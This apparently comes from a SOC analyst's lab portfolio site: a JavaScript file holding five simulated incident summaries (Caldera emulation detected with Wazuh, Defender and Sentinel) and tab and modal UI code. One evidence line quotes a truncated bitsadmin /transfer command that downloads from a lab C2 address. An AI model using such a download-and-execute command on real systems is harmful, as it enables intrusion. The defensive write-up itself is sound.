const INCIDENTS = {
  "inc-001": {
    title: "INC-2026-001 — BITS Job Download",
    html: `
      <section><h4>Summary</h4><p>P2 true positive. Hybrid lab. Wazuh 180001 on the on-prem alert queue, then Defender isolation in the endpoint console. Contained in 13 minutes. Caldera profile: T1-Windows-Download-Exec.</p></section>
      <section><h4>Lab</h4><p>Lab 1 (Wazuh/Sysmon) + Lab 2 (Defender/Sentinel KQL)</p></section>
      <section><h4>MITRE</h4><p>T1197 · T1105 · T1059.003</p></section>
      <section><h4>Timeline (UTC)</h4>
        <pre>14:20  Caldera operation started
14:22  Wazuh alert 180001
14:35  Host isolated (MDE)
14:45  Escalated to Tier 2
16:00  Closed</pre></section>
      <section><h4>Evidence</h4>
        <pre>Image: bitsadmin.exe
CommandLine: bitsadmin /transfer ... http://10.10.30.10:8888/...
User: CORP\\jsmith</pre></section>
      <section><h4>Full report</h4><p><a href="../incidents/INC-2026-001-bits-job-download.md">incidents/INC-2026-001-bits-job-download.md</a></p></section>`
  },
  "inc-002": {
    title: "INC-2026-002 — Linux Persistence",
    html: `
      <section><h4>Summary</h4><p>Lab 1 only. Unauthorized user caldera_svc and malicious crontab on SRV-LNX-01. Wazuh manager alert 5902/2832 within 3 minutes of Caldera execution.</p></section>
      <section><h4>Lab</h4><p>Lab 1 — Wazuh manager, Linux auth.log, auditd on corp.lab.local</p></section>
      <section><h4>MITRE</h4><p>T1136.001 · T1053.003 · T1531 (cleanup)</p></section>
      <section><h4>Actions</h4><p>Blocked egress to C2 · Removed crontab · userdel caldera_svc · Escalated to Linux SME</p></section>
      <section><h4>Full report</h4><p><a href="../incidents/INC-2026-002-linux-account-creation.md">incidents/INC-2026-002-linux-account-creation.md</a></p></section>`
  },
  "inc-003": {
    title: "INC-2026-003 — RDP Port & Network Sniffing",
    html: `
      <section><h4>Summary</h4><p>Hybrid lab. PCAP and pfSense logs on the finance segment, Defender lateral alert on WKSTN-099. IR engaged per policy.</p></section>
      <section><h4>Lab</h4><p>Lab 1 (Splunk/Wireshark/pfSense) + Lab 2 (Defender)</p></section>
      <section><h4>MITRE</h4><p>T1040 · T1021.001</p></section>
      <section><h4>Network</h4><p>PCAP reviewed in Wireshark — no cleartext creds. Firewall correlated RDP probe to DC.</p></section>
      <section><h4>Full report</h4><p><a href="../incidents/INC-2026-003-rdp-port-modification.md">incidents/INC-2026-003-rdp-port-modification.md</a></p></section>`
  },
  "inc-004": {
    title: "INC-2026-004 — VPN False Positive",
    html: `
      <section><h4>Summary</h4><p>Lab 2 only. Sentinel incident from VPN log source — 47 failed logins after geo-block change CHG-8821. No valid AD users. Closed as P5 false positive.</p></section>
      <section><h4>Lab</h4><p>Lab 2 — Sentinel incident queue, pfSense VPN logs</p></section>
      <section><h4>Lesson</h4><p>Correlated with change management before escalation. Filed detection tuning request.</p></section>
      <section><h4>Full report</h4><p><a href="../incidents/INC-2026-004-false-positive-vpn.md">incidents/INC-2026-004-false-positive-vpn.md</a></p></section>`
  },
  "inc-005": {
    title: "INC-2026-005 — Phishing to Endpoint",
    html: `
      <section><h4>Summary</h4><p>Lab 2. User-reported phish with SPF/DKIM/DMARC failures. Sentinel PowerShell rule + Defender on WKSTN-042. Caldera T1-Phish-to-Host.</p></section>
      <section><h4>Lab</h4><p>Lab 2 — Sentinel, Defender, Entra ID sign-in context</p></section>
      <section><h4>MITRE</h4><p>T1566.001 · T1204.002 · T1059.001 · T1071.001</p></section>
      <section><h4>Full report</h4><p><a href="../phishing/sample-phishing-incident.md">phishing/sample-phishing-incident.md</a></p></section>`
  }
};

document.querySelectorAll(".tab").forEach((tab) => {
  tab.addEventListener("click", () => {
    const group = tab.closest("[data-tab-group]");
    if (!group) return;
    const target = tab.dataset.tab;
    group.querySelectorAll(".tab").forEach((t) => t.classList.remove("active"));
    group.querySelectorAll(".tab-panel").forEach((p) => p.classList.remove("active"));
    tab.classList.add("active");
    const panel = group.querySelector(`[data-panel="${target}"]`);
    if (panel) panel.classList.add("active");
  });
});

const modal = document.getElementById("incident-modal");
const modalBody = document.getElementById("modal-body");
const modalTitle = document.getElementById("modal-title");

document.querySelectorAll("[data-incident]").forEach((btn) => {
  btn.addEventListener("click", (e) => {
    e.preventDefault();
    const id = btn.dataset.incident;
    const data = INCIDENTS[id];
    if (!data || !modal) return;
    modalTitle.textContent = data.title;
    modalBody.innerHTML = data.html;
    modal.classList.add("open");
  });
});

document.querySelectorAll(".modal-close").forEach((btn) => {
  btn.addEventListener("click", () => modal?.classList.remove("open"));
});

modal?.addEventListener("click", (e) => {
  if (e.target === modal) modal.classList.remove("open");
});

document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") modal?.classList.remove("open");
});